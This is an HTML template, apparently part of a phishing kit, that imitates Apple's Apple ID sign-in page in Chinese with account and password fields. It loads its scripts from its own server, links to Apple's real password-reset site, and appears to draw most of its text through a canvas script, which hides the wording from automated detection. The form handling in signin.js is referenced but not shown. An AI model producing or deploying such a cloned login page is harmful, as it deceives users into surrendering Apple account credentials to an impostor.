<!DOCTYPE html>
<html dir="ltr" data-rtl="false" lang="zh">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
      <link rel="stylesheet" href="{{ asset('/fonts/fontss.css') }}" type="text/css">
      <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/app-sk7.css') }}">
             <script src="{{ asset('/hccanvastxt/hccanvastxt.min.js?1') }}"></script>
      <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/signin.css') }}">
   </head>
   <body class="tk-body ">
      <div class="si-body si-container container-fluid" id="content" role="main" data-theme="dark">
         <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
            <div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="inline" data-isiebutnotedge="false">
               <div id="step" class="si-step  ">
                  <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn" {(section)}="section"></logo>
                  <div id="stepEl">
                     <sign-in suppress-iforgot="{suppressIforgot}" initial-route="" {on-test-idp}="@_onTestIdp">

                        <div class="signin fade-in" id="signin">
                           <app-title signin-label="true" title-class="">

                              <h1 tabindex="-1" class="si-container-title tk-callout" ><p id="app" ></p>


                              </h1>
                           </app-title>
                           <p class="si-container-description" id="account" ></p>



                           <div class="container si-field-container  password-second-step     ">
                              <div id="sign_in_form" class="signin-form eyebrow fed-auth hide-password">
                                 <div class="si-field-container container">
                                    <div class="">
                                       <div class="account-name form-row    hide-password  ">
                                          <label class="sr-only form-cell form-label" for="account_name_text_field"><p id="Login"></p></label>
                                          <div class="form-cell">

                                             <div class=" form-cell-wrapper form-textbox">
                                                <input type="text" id="account_name_text_field" can-field="accountName" autocomplete="off"
                                                      autocorrect="off" autocapitalize="off" aria-required="true" required="required"
                                                      spellcheck="false" ($focus)="appleIdFocusHandler()" ($keyup)="appleIdKeyupHandler()"
                                                      ($blur)="appleIdBlurHandler()" class="force-ltr form-textbox-input lower-border-reset"
                                                      aria-invalid="false" autofocus="">
                                                <span aria-hidden="true" id="apple_id_field_label"
                                                     class=" form-textbox-label  form-label-flyout"><p id="Email"></p>

                                                </span>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="password form-row   hide-password hide-placeholder    " aria-hidden="true">
                                          <label class="sr-only form-cell form-label" for="password_text_field">密码</label>
                                          <div class="form-cell">
                                             <div class="form-cell-wrapper form-textbox">
                                                <input type="password" id="password_text_field" ($keyup)="passwordKeyUpHandler()"
                                                      ($focus)="pwdFocusHandler()" ($blur)="pwdBlurHandler()" aria-required="true"
                                                      required="required" can-field="password" autocomplete="off" class="form-textbox-input "
                                                      aria-invalid="false" tabindex="-1">
                                                <span id="password_field_label" aria-hidden="true"
                                                     class=" form-textbox-label  form-label-flyout"> 密码
                                                </span>
                                                <span class="sr-only form-label-flyout" id="invalid_user_name_pwd_err_msg"
                                                     aria-hidden="true">
                                                </span>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>

                              <div class="pop-container error signin-error hide" ($click)="errorClickHandler()">
                                 <div class="error pop-bottom tk-subbody-headline" ($click)="errorClickHandler()">
                                    <p class="fat" id="errMsg"><p id="incorrect"></p>
                                    </p>

                                    <a class="si-link ax-outline thin tk-subbody"
                                       href="https://iforgot.apple.com/password/verify/appleid" target="_blank">
                                      忘记了<span class="no-wrap sk-icon sk-icon-after sk-icon-external">密码?</span>
                                       <span
                                            class="sr-only">在新窗口中打开。</span>
                                    </a>


                                 </div>
                              </div>


                              <div class="si-remember-password">
                                 <input type="checkbox" id="remember-me" class="form-choice form-choice-checkbox"
                                       {($checked)}="isRememberMeChecked">
                                 <label id="remember-me-label" class="form-label" for="remember-me">
                                    <span class="form-choice-indicator" aria-hidden="true" id="remember" ></span>
                                 </label>
                              </div>
                              <div class="spinner-container auth  show spinner-hide">
                                 <div class="spinner" role="progressbar"
                                     style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;">
                                    <div
                                        style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-0-12;">
                                       <div
                                           style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(0deg) translate(6.25px, 0px); border-radius: 1px;">
                                       </div>
                                    </div>
                                    <div
                                        style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-1-12;">
                                       <div
                                           style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(30deg) translate(6.25px, 0px); border-radius: 1px;">
                                       </div>
                                    </div>
                                    <div
                                        style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-2-12;">
                                       <div
                                           style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(60deg) translate(6.25px, 0px); border-radius: 1px;">
                                       </div>
                                    </div>
                                    <div
                                        style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-3-12;">
                                       <div
                                           style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(90deg) translate(6.25px, 0px); border-radius: 1px;">
                                       </div>
                                    </div>
                                    <div
                                        style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-4-12;">
                                       <div
                                           style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(120deg) translate(6.25px, 0px); border-radius: 1px;">
                                       </div>
                                    </div>
                                    <div
                                        style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-5-12;">
                                       <div
                                           style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(150deg) translate(6.25px, 0px); border-radius: 1px;">
                                       </div>
                                    </div>
                                    <div
                                        style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-6-12;">
                                       <div
                                           style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(180deg) translate(6.25px, 0px); border-radius: 1px;">
                                       </div>
                                    </div>
                                    <div
                                        style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-7-12;">
                                       <div
                                           style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(210deg) translate(6.25px, 0px); border-radius: 1px;">
                                       </div>
                                    </div>
                                    <div
                                        style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-8-12;">
                                       <div
                                           style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(240deg) translate(6.25px, 0px); border-radius: 1px;">
                                       </div>
                                    </div>
                                    <div
                                        style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-9-12;">
                                       <div
                                           style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(270deg) translate(6.25px, 0px); border-radius: 1px;">
                                       </div>
                                    </div>
                                    <div
                                        style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-10-12;">
                                       <div
                                           style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(300deg) translate(6.25px, 0px); border-radius: 1px;">
                                       </div>
                                    </div>
                                    <div
                                        style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-11-12;">
                                       <div
                                           style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(330deg) translate(6.25px, 0px); border-radius: 1px;">
                                       </div>
                                    </div>
                                 </div>
                              </div>
                              <button id="sign-in" ($click)="_verify($element)" tabindex="0"
                                    class="si-button btn  fed-ui   fed-ui-animation-show   disable   remember-me" aria-label="continue"
                                    aria-disabled="true" disabled="">
                                 <i class="shared-icon icon_sign_in"></i>
                                 <span class="text feat-split">
                                    继续

                                 </span>
                              </button>
                              <button id="sign-in-cancel" ($click)="_signInCancel($element)" aria-disabled="false" tabindex="0"
                                    class="si-button btn secondary feat-split  remember-me   link " aria-label="closure">
                                 <span class="text"> 关闭

                                 </span>
                              </button>
                           </div>
                           <div class="si-container-footer">

                              <div class="separator "></div>
                              <div class="links tk-subbody">
                                 <div class="si-forgot-password">
                                    <a id="iforgot-link" class="si-link ax-outline lite-theme-override"
                                       ($click)="iforgotLinkClickHandler($element)"
                                       href="https://iforgot.apple.com/password/verify/appleid" target="_blank" ><p  id="Forgot"></p>
                                  <span class="no-wrap sk-icon sk-icon-after sk-icon-external">密码?</span>
                                       <span
                                            class="sr-only">在新窗口中打开.</span>
                                    </a>
                                 </div>

                              </div>

                           </div>
                        </div>

                     </sign-in>
                  </div>
               </div>
               <div id="stocking" style="display:none !important;"></div>

            </div>
            <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false">
            </idms-modal>
         </apple-auth>
      </div>
      <script type="text/javascript" src="{{ asset('/js/apple/jquery-3.6.1.min.js') }}"></script>
      <script src="{{ asset('/hccanvastxt/initcanvas.min.js') }}" ></script>

      <script type="text/javascript" src="{{ asset('/js/apple/jquery.cookie.js') }}"></script>
      <script type="text/javascript" src="{{ asset('/js/apple/signin.js') }}"></script>
   </body>

</html>
